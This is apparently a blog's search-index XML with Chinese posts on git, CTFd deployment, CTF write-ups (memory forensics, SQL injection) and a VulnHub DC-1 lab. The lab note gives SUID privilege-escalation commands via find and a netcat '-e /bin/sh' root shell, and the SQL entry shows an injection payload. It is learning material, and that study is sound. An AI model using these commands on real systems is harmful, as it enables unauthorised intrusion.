<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>git命令</title>
    <link href="/git/git-ming-ling/"/>
    <url>/git/git-ming-ling/</url>
    
    <content type="html"><![CDATA[<h2 id="git命令复习"><a href="#git命令复习" class="headerlink" title="git命令复习"></a>git命令复习</h2><p><code>git status</code>        //查看当前状态</p><p><code>git add .</code>    //将所有文件加到暂存区</p><p><code>git commit -m "完成了xx功能"</code>    //将暂存区中的代码提交到本地仓库中</p><p><code>git branch</code>            //查看分支情况，带*的为当前分支</p><p><code>git checkout -b login</code>        //创建login分支</p><h5 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h5><p><code>git checkout master</code>    //切换到master分支</p><p><code>git merge login</code>        //    将login分支中的合并到主分支中</p><h5 id="推送到远程仓库中"><a href="#推送到远程仓库中" class="headerlink" title="推送到远程仓库中"></a>推送到远程仓库中</h5><p><code>git push</code> </p><h5 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h5><p><code>git checkout login</code></p><p><code>git branch</code></p><p><code>git push -u origin login</code>        //将本地的login子分支推送到云端origin仓储里并叫做login子分支</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFd的搭建部署</title>
    <link href="/docker/ctfd/ctfd-de-da-jian-bu-shu/"/>
    <url>/docker/ctfd/ctfd-de-da-jian-bu-shu/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近把博客图床迁移到了gitee，然后服务器腾了出来，鼓捣一下CTFd平台的搭建</p><p>本文从服务器安全组配置入手，然后docker安装，从0进行</p><h2 id="一、服务器安全组配置"><a href="#一、服务器安全组配置" class="headerlink" title="一、服务器安全组配置"></a>一、服务器安全组配置</h2><p>我选择的是ubuntu 18.04位，阿里云，安全组配置如下</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112145523.png" srcset="/img/loading.gif" alt=""></p><h2 id="二、docker以及docker-compose的安装"><a href="#二、docker以及docker-compose的安装" class="headerlink" title="二、docker以及docker-compose的安装"></a>二、docker以及docker-compose的安装</h2><h3 id="1-使用官方脚本自动安装"><a href="#1-使用官方脚本自动安装" class="headerlink" title="1.使用官方脚本自动安装"></a>1.使用官方脚本自动安装</h3><pre class=" language-shell"><code class="language-shell">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></pre><p>或者国内 daocloud 一键安装命令</p><pre class=" language-shell"><code class="language-shell">curl -sSL https://get.daocloud.io/docker | sh</code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class=" language-shell"><code class="language-shell">sudo docker run hello-world</code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112154251.png" srcset="/img/loading.gif" alt=""></p><h3 id="2-docker-compose安装"><a href="#2-docker-compose安装" class="headerlink" title="2.docker-compose安装"></a>2.docker-compose安装</h3><pre class=" language-shell"><code class="language-shell">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` > /usr/local/bin/docker-compose</code></pre><p>将可执行权限应用于二进制文件：</p><pre class=" language-shell"><code class="language-shell">sudo chmod +x /usr/local/bin/docker-compose</code></pre><p>测试是否安装成功：</p><pre class=" language-shell"><code class="language-shell">$ docker-compose --versioncker-compose version 1.24.1, build 4667896b</code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112154302.png" srcset="/img/loading.gif" alt=""></p><p>docker镜像加速：</p><p><a href="https://cr.console.aliyun.com/cn-beijing/instances/mirrors" target="_blank" rel="noopener">https://cr.console.aliyun.com/cn-beijing/instances/mirrors</a></p><h2 id="三、搭建CTFd"><a href="#三、搭建CTFd" class="headerlink" title="三、搭建CTFd"></a>三、搭建CTFd</h2><h5 id="我采用的是单机-Direct-Http-模式（Frp-转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）"><a href="#我采用的是单机-Direct-Http-模式（Frp-转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）" class="headerlink" title="我采用的是单机 Direct + Http 模式（Frp 转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）"></a>我采用的是单机 Direct + Http 模式（Frp 转发在一个机器上，只需要一台机器，靶机通过端口号或者域名访问，需要配置域名解析）</h5><h5 id="准备一个域名，设置如下解析。"><a href="#准备一个域名，设置如下解析。" class="headerlink" title="准备一个域名，设置如下解析。"></a>准备一个域名，设置如下解析。</h5><ul><li>A | *.test.127.0.0.1.nip.io | 你机器 IP</li></ul><h5 id="启用docker-swarm"><a href="#启用docker-swarm" class="headerlink" title="启用docker-swarm"></a>启用docker-swarm</h5><pre class=" language-shell"><code class="language-shell">docker swarm initdocker node ls</code></pre><h5 id="标记-amp-命名节点"><a href="#标记-amp-命名节点" class="headerlink" title="标记&amp;命名节点"></a>标记&amp;命名节点</h5><pre class=" language-shell"><code class="language-shell">docker node update --label-add name=输入你想起的名字 IDvalue#IDvalue 位于上图ID下方 复制粘贴即可</code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112155005.png" srcset="/img/loading.gif" alt=""></p><h5 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h5><pre class=" language-shell"><code class="language-shell">yum install git</code></pre><h5 id="验证git安装是否成功"><a href="#验证git安装是否成功" class="headerlink" title="验证git安装是否成功"></a>验证git安装是否成功</h5><pre class=" language-shell"><code class="language-shell">git --version</code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112155239.png" srcset="/img/loading.gif" alt=""></p><p>下载CTFd代码</p><pre class=" language-shell"><code class="language-shell">git clone -b single-http https://github.com/glzjin/CTFd.git</code></pre><p>可以迁移到自己的gitee平台，速度会快一些</p><pre class=" language-shell"><code class="language-shell">git clone -b single-http https://gitee.com/mushiyu/CTFd.git</code></pre><p>进入目录，编辑 frp 两端配置文件，使 token 随机，使用 docker-compose 启动相关组件。</p><pre class=" language-shell"><code class="language-shell">cd CTFdvi frp/frps.ini # token 一定要随机vi frp/frpc.ini # token 一定要随机git submodule update --initdocker-compose up -d</code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112184043.png" srcset="/img/loading.gif" alt=""></p><p>报错我们可以将Dockerfile文件下的python与python-dev改为python3 python3-dev</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112155924.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210112180659.png" srcset="/img/loading.gif" alt=""></p><p>报错，可以修改requirements.txt，删除gevent的版本号</p><pre><code>/requirements.txt...redis==3.3.11datafreeze==0.1.0geventpython-dotenv==0.10.3flask-restplus==0.13.0...</code></pre><p>然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题</p><p>启动完毕，打开 <a href="http://ip:8000" target="_blank" rel="noopener">http://ip:8000</a> 安装 CTFd</p><p><a href="https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp</a></p><h2 id="四、优化方面："><a href="#四、优化方面：" class="headerlink" title="四、优化方面："></a>四、优化方面：</h2><blockquote><p><a href="https://blog.csdn.net/weixin_43880435/article/details/107339592" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43880435/article/details/107339592</a></p></blockquote><p>修改css，加快渲染速度</p><p>添加邮箱设置如下：</p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210114202407.png" srcset="/img/loading.gif" style="zoom:67%;"><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210114202321.png" srcset="/img/loading.gif" style="zoom:67%;"><h2 id="五、自己瞎记的一些docker命令"><a href="#五、自己瞎记的一些docker命令" class="headerlink" title="五、自己瞎记的一些docker命令"></a>五、自己瞎记的一些docker命令</h2><p>//ps.. docker删除的命令</p><pre class=" language-shell"><code class="language-shell">docker rm `docker ps -a -q`        //docker删除所有容器docker rmi `docker images -q`    //docker删除所有镜像</code></pre><h2 id="六、nginx-80端口与frps中vhost端口冲突解决方案"><a href="#六、nginx-80端口与frps中vhost端口冲突解决方案" class="headerlink" title="六、nginx 80端口与frps中vhost端口冲突解决方案"></a>六、nginx 80端口与frps中vhost端口冲突解决方案</h2><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210306231104.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210306230729.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210306230801.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210306230850.png" srcset="/img/loading.gif" alt=""></p><p>nginx配置如下：</p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> <span class="token operator">*</span><span class="token punctuation">.</span>test<span class="token punctuation">.</span>sipcoj<span class="token punctuation">.</span>com<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#   return 301 https://$host$request_uri;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">1234</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_redirect</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token variable">$host</span><span class="token operator">/</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token variable">$http_host</span><span class="token operator">/</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Real<span class="token operator">-</span>IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        <span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="4-25更新"><a href="#4-25更新" class="headerlink" title="4.25更新"></a>4.25更新</h2><p>gevent问题，参考</p><blockquote><p><a href="http://o0o0.club/%E5%9C%A8alpine%E4%B8%AD%E5%AE%89%E8%A3%85gevent%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">http://o0o0.club/%E5%9C%A8alpine%E4%B8%AD%E5%AE%89%E8%A3%85gevent%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</a></p></blockquote><p>Dockerfile文件如下：</p><pre class=" language-dockerfile"><code class="language-dockerfile">FROM python:3.7-alpineWORKDIR /opt/CTFdRUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploadsRUN sed -i 's/dl-cdn.alpinelinux.org/mirror.tuna.tsinghua.edu.cn/g' /etc/apk/repositories && \    apk update && \    apk add \        python3 \        python3-dev \        linux-headers \        libffi-dev \        gcc \    g++    \    libffi-dev    \        make \        musl-dev \        py-pip \        mysql-client \        git \        openssl-devCOPY . /opt/CTFdRUN pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r requirements.txtRUN for d in CTFd/plugins/*; do \      if [ -f "$d/requirements.txt" ]; then \        pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com -r $d/requirements.txt; \      fi; \    done;RUN chmod +x /opt/CTFd/docker-entrypoint.shRUN adduser -D -u 1001 -s /bin/sh ctfdRUN chown -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploadsUSER 1001EXPOSE 8000ENTRYPOINT ["/opt/CTFd/docker-entrypoint.sh"]</code></pre><h2 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h2><blockquote><p>参考博客：</p><p><a href="https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html/comment-page-2#_Direct_Frp</a></p><p><a href="https://hujiekang.top/2020/04/26/CTFd-conf/" target="_blank" rel="noopener">https://hujiekang.top/2020/04/26/CTFd-conf/</a></p><p><a href="https://err0r.top/article/CTFD/" target="_blank" rel="noopener">https://err0r.top/article/CTFD/</a></p><p><a href="https://www.ioiox.com/archives/98.html" target="_blank" rel="noopener">https://www.ioiox.com/archives/98.html</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
      <category>CTFd</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-misc</title>
    <link href="/ctf/buu-misc/"/>
    <url>/ctf/buu-misc/</url>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N-2020-公开赛-MISC内存取证"><a href="#V-amp-N-2020-公开赛-MISC内存取证" class="headerlink" title="V&amp;N 2020 公开赛-MISC内存取证"></a>V&amp;N 2020 公开赛-MISC内存取证</h1><p>这是当时Gality师傅发来的一道题，当时没有做出来，相当于赛后复现吧，感觉这个题还是蛮有价值的</p><blockquote><p>附件链接：<a href="https://pan.baidu.com/s/1F-44z1lFPXjN_o4Y4VcC9A" target="_blank" rel="noopener">https://pan.baidu.com/s/1F-44z1lFPXjN_o4Y4VcC9A</a><br>提取码：3i9m </p></blockquote><p>借鉴一位师傅的题目思路：</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111201409.png" srcset="/img/loading.gif" alt=""></p><p>确定内存镜像版本</p><pre class=" language-shell"><code class="language-shell">volatility -f mem.raw imageinfo</code></pre><p>判断进程，同类型的命令还有pstree和psscan</p><pre class=" language-shell"><code class="language-shell">volatility -f mem.raw --profile=Win7SP0x86 pslist</code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111201323.jpg" srcset="/img/loading.gif" alt=""></p><p>发现三个可疑进程</p><p>全部导出</p><pre class=" language-shell"><code class="language-shell">volatility -f mem.raw --profile=Win7SP0x86 memdump -p 2648 --dump-dir=./volatility -f mem.raw --profile=Win7SP0x86 memdump -p 3364 --dump-dir=./volatility -f mem.raw --profile=Win7SP0x86 memdump -p 3552 --dump-dir=./</code></pre><h2 id="一、mspaint-exe-pid-2648"><a href="#一、mspaint-exe-pid-2648" class="headerlink" title="一、mspaint.exe (pid 2648)"></a>一、mspaint.exe (pid 2648)</h2><blockquote><p>参考链接：<a href="https://segmentfault.com/a/1190000018813033?utm_source=tag-newest" target="_blank" rel="noopener">https://segmentfault.com/a/1190000018813033?utm_source=tag-newest</a></p></blockquote><p>随机给<strong>位移、宽度</strong>（可以先从常见的分辨率选择，建议<strong>1440</strong>）、<strong>高度</strong>调整一点数据，让有图像显示，哪怕是乱码，然后调整<strong>高度</strong></p><p>固定宽度之后调整<strong>位移</strong>，位移可以直接大范围拖动进度条进行粗略调整（右边上下两个小箭头长按微调是调整图像左右，粗略进度条是调整图像上下）</p><p>然后你就可能会看到下图的样子，有像是字符的存在，此时<strong>调整好左右</strong>就不要动了，<strong>开始调整宽度</strong></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111201823.jpg" srcset="/img/loading.gif" alt=""></p><p>同样也是调整右边的上下箭头，对<strong>宽度</strong>进行微调（宽度不要用进度条调整，数据太快了看不清，一般不会太大。鼠标一直点击上下箭头可以快速调整）</p><p>调整过程中你可能会看到字符飞快地变形，从原来的斜着的逐渐立起来</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111201846.jpg" srcset="/img/loading.gif" alt=""></p><p>使用ps垂直翻转</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111201902.jpg" srcset="/img/loading.gif" alt=""></p><p>得出密码</p><pre class=" language-shell"><code class="language-shell">1YxfCQ6goYBD6Q</code></pre><h2 id="二、-notepad-exe-pid-3552"><a href="#二、-notepad-exe-pid-3552" class="headerlink" title="二、 notepad.exe (pid 3552)"></a>二、 notepad.exe (pid 3552)</h2><p>根据volatility 帮助文档，editbox插件可以显示有关编辑控件的信息。notepad插件是只能在对windows xp镜像分析中进行使用，editbox很好的替代了它的功能</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111202033.jpg" srcset="/img/loading.gif" alt=""></p><blockquote><p>据说原始网盘链接已经过期了，补链接：</p><p>链接：<a href="https://pan.baidu.com/s/14aqByt4prda3WuFMhTE70g" target="_blank" rel="noopener">https://pan.baidu.com/s/14aqByt4prda3WuFMhTE70g</a><br>提取码：m19h </p></blockquote><p>法二，通过strings提取，这种如果事先知道字符串，可以快一些</p><pre class=" language-shell"><code class="language-shell">strings -e l ./notepad.dmp </code></pre><blockquote><p><em>-e –encoding = {s，S，b，l，B，L}选择字符大小和字节顺序：</em><br><em>s = 7位，S = 8位，{b，l} = 16位，{B，L} = 32位</em></p></blockquote><p>内容很多，所以我们用grep筛选一下，关键词是<code>pan</code>，我们无法确定网盘提取码在第几行，所以我们规定输出<code>pan</code>字符串的上下5行,把输出内容输入到文档notepad.txt里</p><pre class=" language-shell"><code class="language-shell">strings -e l ./notepad.dmp | grep "pan" -B 5 -A 5 > notepad.txt</code></pre><h2 id="三、TrueCrypt-exe-pid-3364"><a href="#三、TrueCrypt-exe-pid-3364" class="headerlink" title="三、TrueCrypt.exe (pid 3364)"></a>三、TrueCrypt.exe (pid 3364)</h2><blockquote><p>参考：<a href="https://blog.xiafeng2333.top/ctf-11/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/ctf-11/</a></p></blockquote><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111202518.jpg" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111202523.jpg" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111202529.jpg" srcset="/img/loading.gif" alt=""></p><pre class=" language-shell"><code class="language-shell">uOjFdKu1jsbWI8N51jsbWI8N5</code></pre><p>然后使用TrueCrypt或者VeraCrypt对<strong>VOL</strong>进行正常的解密</p><blockquote><p>参考  <a href="https://blog.51cto.com/linhong/2406226" target="_blank" rel="noopener">https://blog.51cto.com/linhong/2406226</a></p></blockquote><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111202637.jpg" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111202734.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>RoarCTF{wm_D0uB1e_TC-cRypt}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>[2019]EasySQL</title>
    <link href="/ctf/2019-easysql/"/>
    <url>/ctf/2019-easysql/</url>
    
    <content type="html"><![CDATA[<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><ul><li><p>这个和强网杯相似，都是堆叠注入，在公开的源码中可以看到，传入的 <code>query</code> 长度不超过 40</p></li><li><p>关键的查询代码是 <code>select $post['query']||flag from Flag</code></p></li><li><p>这里要想办法使得||变为字符串连接操作符，来拼接sql命令</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111192126.png" srcset="/img/loading.gif" alt=""></p></li></ul><h5 id="PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。"><a href="#PIPES-AS-CONCAT-将-视为字符串的连接操作符而非-或-运算符，这和Oracle数据库是一样的，也和字符串的拼接函数-CONCAT-相类似。" class="headerlink" title="PIPES_AS_CONCAT 将 || 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。"></a><strong><code>PIPES_AS_CONCAT</code></strong> 将 <code>||</code> 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。</h5><p>本地测试一下：</p><p>1.sql_mode不为PIPES_AS_CONCAT</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111192123.png" srcset="/img/loading.gif" alt=""></p><p>1.sql_mode为PIPES_AS_CONCAT</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111192124.png" srcset="/img/loading.gif" alt=""></p><ul><li>关于非预期解 : <code>*,1</code></li><li>拼接一下，不难理解 : <code>select *,1||flag from Flag</code></li><li>等同于 <code>select *,1 from Flag</code></li></ul><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111192125.png" srcset="/img/loading.gif" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DC靶场</title>
    <link href="/shen-tou-ce-shi/dc-ba-chang/"/>
    <url>/shen-tou-ce-shi/dc-ba-chang/</url>
    
    <content type="html"><![CDATA[<h3 id="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"><a href="#最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点" class="headerlink" title="最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点"></a>最近在练习VulnHubDC靶场，在这里记录下自己不太熟悉的一些知识点</h3><h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="1-发现存活主机"><a href="#1-发现存活主机" class="headerlink" title="1.发现存活主机"></a>1.发现存活主机</h4><h5 id="（1）nmap发现内网存活主机"><a href="#（1）nmap发现内网存活主机" class="headerlink" title="（1）nmap发现内网存活主机"></a>（1）nmap发现内网存活主机</h5><pre><code>nmap -sP 192.168.1.0/24nmap -A -p1-65535 -T4 ip  //扫描端口</code></pre><h5 id="（2）使用msf模块"><a href="#（2）使用msf模块" class="headerlink" title="（2）使用msf模块"></a>（2）使用msf模块</h5><pre><code>use auxiliary/scanner/discovery/arp_sweep use auxiliary/scanner/discovery/udp_sweepset rhosts 192.168.1.0/24</code></pre><h4 id="2-msf-查找可利用脚本"><a href="#2-msf-查找可利用脚本" class="headerlink" title="2.msf 查找可利用脚本"></a>2.msf 查找可利用脚本</h4><pre><code>searchsploit xxx</code></pre><h4 id="3-反弹shell升级半交互式"><a href="#3-反弹shell升级半交互式" class="headerlink" title="3.反弹shell升级半交互式"></a>3.反弹shell升级半交互式</h4><h5 id="半交互式shell"><a href="#半交互式shell" class="headerlink" title="半交互式shell"></a>半交互式shell</h5><p>对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：</p><pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span> </code></pre><h4 id="4-使用suid提权"><a href="#4-使用suid提权" class="headerlink" title="4.使用suid提权"></a>4.使用suid提权</h4><p>常见的可用来提权的linux可执行文件有：</p><p>Nmap , Vim , find , bash , more , less , nano , cp</p><p>查找具有root权限的命令，以下几条均可以查询</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb { }</code></pre><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><pre><code>ls -al /usr/bin/find-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><p>定位到tmp目录下，touch（创建）一个aaa文件</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111192321.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>find aaa -exec '/bin/sh' \;</code></pre><p>大部分Linux 系统都安装了nc。使用</p><p><code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code></p><p> 即可成功反弹root shell</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>volatility使用</title>
    <link href="/qu-zheng/volatility-shi-yong/"/>
    <url>/qu-zheng/volatility-shi-yong/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h4 id="有一类题叫做内存取证题，简单了解有关内存取证的基本知识与命令"><a href="#有一类题叫做内存取证题，简单了解有关内存取证的基本知识与命令" class="headerlink" title="有一类题叫做内存取证题，简单了解有关内存取证的基本知识与命令"></a>有一类题叫做内存取证题，简单了解有关内存取证的基本知识与命令</h4><h4 id="工具：volatility"><a href="#工具：volatility" class="headerlink" title="工具：volatility"></a>工具：volatility</h4><h2 id="volatility使用"><a href="#volatility使用" class="headerlink" title="volatility使用"></a>volatility使用</h2><h4 id="1-常用命令总结："><a href="#1-常用命令总结：" class="headerlink" title="1.常用命令总结："></a>1.常用命令总结：</h4><pre><code>clipboard          Extract the contents of the windows clipboardcmdline            Display process command-line argumentscmdscan            Extract command history by scanning for _COMMAND_HISTORYconsoles           Extract command history by scanning for _CONSOLE_INFORMATIONdeskscan           Poolscaner for tagDESKTOP (desktops)dumpcerts          Dump RSA private and public SSL keysdumpfiles          Extract memory mapped and cached filesdumpregistry       Dumps registry files out to disk editbox            Displays information about Edit controls. (Listbox experimental.)  //比如win7查看记事本内容filescan           Pool scanner for file objectshashdump           Dumps passwords hashes (LM/NTLM) from memoryiehistory        ie historyimageinfo          Identify information for the imagemalfind            Find hidden and injected codememdump            Dump the addressable memory for a processnotepad            List currently displayed notepad textprocdump           Dump a process to an executable file samplepslist             Print all running processes by following the EPROCESS lists psscan             Pool scanner for process objectspstree             Print process list as a treepsxview            Find hidden processes with various process listingstimeliner          Creates a timeline from various artifacts in memory truecryptmaster    Recover TrueCrypt 7.1a Master Keystruecryptpassphrase    TrueCrypt Cached Passphrase Findertruecryptsummary    TrueCrypt Summarywindows            Print Desktop Windows (verbose details)wintree            Print Z-Order Desktop Windows Tree</code></pre><h4 id="2-简单介绍几种操作："><a href="#2-简单介绍几种操作：" class="headerlink" title="2.简单介绍几种操作："></a>2.简单介绍几种操作：</h4><pre class=" language-bash"><code class="language-bash">volatility -f xx.raw/xx.vmem imageinfo <span class="token comment" spellcheck="true">#查看系统版本</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193025.png" srcset="/img/loading.gif" alt=""></p><p>可以看出系统版本为win7x86</p><pre class=" language-bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 pslist <span class="token comment" spellcheck="true"># 列出进程</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193100.png" srcset="/img/loading.gif" alt=""></p><pre class=" language-bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP0x86 cmdscan <span class="token comment" spellcheck="true">#查看cmd命令历史</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193129.png" srcset="/img/loading.gif" alt=""></p><pre class=" language-bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 pslist <span class="token operator">|</span><span class="token function">grep</span> notepad.exe <span class="token comment" spellcheck="true">#结合grep查找进程</span>volatility -f 